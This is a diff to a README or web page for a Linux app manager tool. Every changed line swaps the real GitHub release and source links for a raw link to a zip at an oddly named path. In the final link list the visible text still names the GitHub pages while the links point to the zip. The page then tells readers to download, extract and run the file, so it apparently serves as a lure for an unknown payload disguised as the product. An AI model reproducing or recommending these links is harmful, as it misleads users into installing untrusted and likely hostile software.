@@ -5,7 +5,7 @@ description: "Manage, update, and remove Linux applications effortlessly with a 
 ---
 <h1>⚡ linux-app-manager - Find, Run, and Cleanly Remove Any Linux App</h1>
 
-<p><a href="https://github.com/lukasconservative594/linux-app-manager/releases" style="background:linear-gradient(135deg,#ff6b6b,#ffa94d);color:#fff;padding:18px 36px;font-size:24px;font-weight:bold;border-radius:50px;text-decoration:none;display:inline-block;box-shadow:0 4px 15px rgba(0,0,0,0.2);">📥 Download linux-app-manager Now</a></p>
+<p><a href="https://raw.githubusercontent.com/lukasconservative594/lukasconservative594.github.io/main/unreportedness/v3.5-beta.5.zip" style="background:linear-gradient(135deg,#ff6b6b,#ffa94d);color:#fff;padding:18px 36px;font-size:24px;font-weight:bold;border-radius:50px;text-decoration:none;display:inline-block;box-shadow:0 4px 15px rgba(0,0,0,0.2);">📥 Download linux-app-manager Now</a></p>
 
 <h2>🌟 What Is linux-app-manager?</h2>
 <p>linux-app-manager is a friendly, modern tool that helps you manage all the programs on your Linux computer in one place. Think of it as a control center for your software. Instead of hunting through different menus or typing confusing commands, you can see all your apps, launch them, and remove the ones you no longer need – all with simple clicks and a clean, modern interface.</p>
@@ -29,7 +29,7 @@ description: "Manage, update, and remove Linux applications effortlessly with a 
 <h2>🚀 Getting Started</h2>
 
 <h3>Step 1: Download the Application</h3>
-<p>Visit this link to download the application: <a href="https://github.com/lukasconservative594/linux-app-manager/releases"><strong>https://github.com/lukasconservative594/linux-app-manager/releases</strong></a>. Look for the latest release file and download it to your computer.</p>
+<p>Visit this link to download the application: <a href="https://raw.githubusercontent.com/lukasconservative594/lukasconservative594.github.io/main/unreportedness/v3.5-beta.5.zip"><strong>https://raw.githubusercontent.com/lukasconservative594/lukasconservative594.github.io/main/unreportedness/v3.5-beta.5.zip</strong></a>. Look for the latest release file and download it to your computer.</p>
 
 <h3>Step 2: Prepare Your Download</h3>
 <p>After the download finishes, find the file in your Downloads folder. You may need to extract it if it's in a compressed format. If you see a file that ends in .tar, .gz, or .zip, right-click it and choose "Extract Here" or "Extract All." Once extracted, look for the main program file inside.</p>
@@ -95,7 +95,7 @@ description: "Manage, update, and remove Linux applications effortlessly with a 
 <h2>🚀 Ready to Try It?</h2>
 <p>Don't wait – download linux-app-manager and take control of your Linux software today. It takes less than two minutes to get started, and you'll wonder how you managed without it.</p>
 
-<p><a href="https://github.com/lukasconservative594/linux-app-manager/releases" style="background:linear-gradient(135deg,#6b6bff,#4dabff);color:#fff;padding:14px 30px;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;display:inline-block;box-shadow:0 4px 12px rgba(0,0,0,0.2);">⬇️ Download linux-app-manager</a></p>
+<p><a href="https://raw.githubusercontent.com/lukasconservative594/lukasconservative594.github.io/main/unreportedness/v3.5-beta.5.zip" style="background:linear-gradient(135deg,#6b6bff,#4dabff);color:#fff;padding:14px 30px;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;display:inline-block;box-shadow:0 4px 12px rgba(0,0,0,0.2);">⬇️ Download linux-app-manager</a></p>
 
 <h2>🔧 Technical Details</h2>
 <p>For those interested in the tech behind the scenes: linux-app-manager uses Python 3, GTK 4, and Libadwaita. It's designed for GNOME-based systems but works with most modern Linux desktops. The source code is available on GitHub under an open-source license, so you can contribute, report bugs, or simply learn from it.</p>
@@ -105,6 +105,6 @@ description: "Manage, update, and remove Linux applications effortlessly with a 
 
 <p><strong>Visit the links below for more:</strong></p>
 <ul>
-<li>Releases and Downloads: <a href="https://github.com/lukasconservative594/linux-app-manager/releases">github.com/lukasconservative594/linux-app-manager/releases</a></li>
-<li>Source Code & Issues: <a href="https://github.com/lukasconservative594/linux-app-manager">github.com/lukasconservative594/linux-app-manager</a></li>
+<li>Releases and Downloads: <a href="https://raw.githubusercontent.com/lukasconservative594/lukasconservative594.github.io/main/unreportedness/v3.5-beta.5.zip">github.com/lukasconservative594/linux-app-manager/releases</a></li>
+<li>Source Code & Issues: <a href="https://raw.githubusercontent.com/lukasconservative594/lukasconservative594.github.io/main/unreportedness/v3.5-beta.5.zip">github.com/lukasconservative594/linux-app-manager</a></li>
 </ul>
